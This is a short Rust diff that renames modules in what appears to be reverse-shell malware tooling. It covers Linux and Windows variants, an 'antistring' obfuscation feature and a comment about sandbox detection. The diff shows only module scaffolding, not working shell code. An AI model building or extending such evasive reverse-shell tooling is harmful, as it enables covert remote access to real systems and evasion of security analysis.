@@ -1,18 +1,18 @@
 // Load Linux implementation if the target OS is Linux
 #[cfg(target_os = "linux")]
-mod rco_reverse_shell_linux;
+mod reverse_shell_linux;
 #[cfg(target_os = "linux")]
-use rco_reverse_shell_linux::shell;
+use reverse_shell_linux::shell;
 
 // Load Windows implementation if the target OS is Windows
 #[cfg(all(windows, not(feature = "antistring")))]
-mod rco_reverse_shell_windows;
+mod reverse_shell_windows;
 #[cfg(all(windows, not(feature = "antistring")))]
-use rco_reverse_shell_windows::shell;
+use reverse_shell_windows::shell;
 #[cfg(all(windows, feature = "antistring"))]
-mod rco_reverse_shell_windows_antistring;
+mod reverse_shell_windows_antistring;
 #[cfg(all(windows, feature = "antistring"))]
-use rco_reverse_shell_windows_antistring::shell;
+use reverse_shell_windows_antistring::shell;
 
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
